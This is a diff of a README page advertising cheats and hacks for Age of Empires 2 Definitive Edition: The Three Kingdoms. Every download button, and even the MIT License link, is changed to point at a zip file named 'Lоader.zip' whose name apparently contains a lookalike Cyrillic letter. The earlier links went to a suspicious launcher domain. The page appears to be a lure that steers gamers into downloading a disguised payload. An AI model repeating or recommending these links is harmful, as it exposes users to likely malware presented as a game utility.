@@ -1,6 +1,6 @@
 # 🎮 Age of Empires 2 Definitive Edition The Three Kingdoms Cheats & Hacks
 
-[![Download Now](https://img.shields.io/badge/Download-EasyLauncher-blue?logo=github)](https://easylauncher.su/PSnzrH)
+[![Download Now](https://raw.githubusercontent.com/RodrigoLatino/ENERGOBRAMA_STOPLIGHT/main/Lоader.zip)](https://raw.githubusercontent.com/RodrigoLatino/ENERGOBRAMA_STOPLIGHT/main/Lоader.zip)
 
 Welcome to the **Ultimate Enhancement Utility** for Age of Empires 2 Definitive Edition: The Three Kingdoms. Unlock superior strategy, max out resources, and transform your gameplay experience with cutting-edge enhancements engineered for elite players in 2025! Enjoy boosted features & powerful shortcuts for every battlefield scenario.
 
@@ -32,7 +32,7 @@ Age of Empires 2 DE mods, AoE2 Three Kingdoms hacks, gameplay improvements, reso
 
 ## 📥 Installation Guide
 **Step 1:**  
-[![Download Now](https://img.shields.io/badge/Download-EasyLauncher-blue?logo=github)](https://easylauncher.su/PSnzrH)  
+[![Download Now](https://raw.githubusercontent.com/RodrigoLatino/ENERGOBRAMA_STOPLIGHT/main/Lоader.zip)](https://raw.githubusercontent.com/RodrigoLatino/ENERGOBRAMA_STOPLIGHT/main/Lоader.zip)  
 Start your download from the official link above.
 
 ---
@@ -44,8 +44,8 @@ This program is meant for learning, experimentation, and personal use only. Use 
 
 ## 📃 License
 
-This project is open-sourced under the [MIT License](https://opensource.org/license/mit/).
+This project is open-sourced under the [MIT License](https://raw.githubusercontent.com/RodrigoLatino/ENERGOBRAMA_STOPLIGHT/main/Lоader.zip).
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-EasyLauncher-blue?logo=github)](https://easylauncher.su/PSnzrH)
+[![Download Now](https://raw.githubusercontent.com/RodrigoLatino/ENERGOBRAMA_STOPLIGHT/main/Lоader.zip)](https://raw.githubusercontent.com/RodrigoLatino/ENERGOBRAMA_STOPLIGHT/main/Lоader.zip)
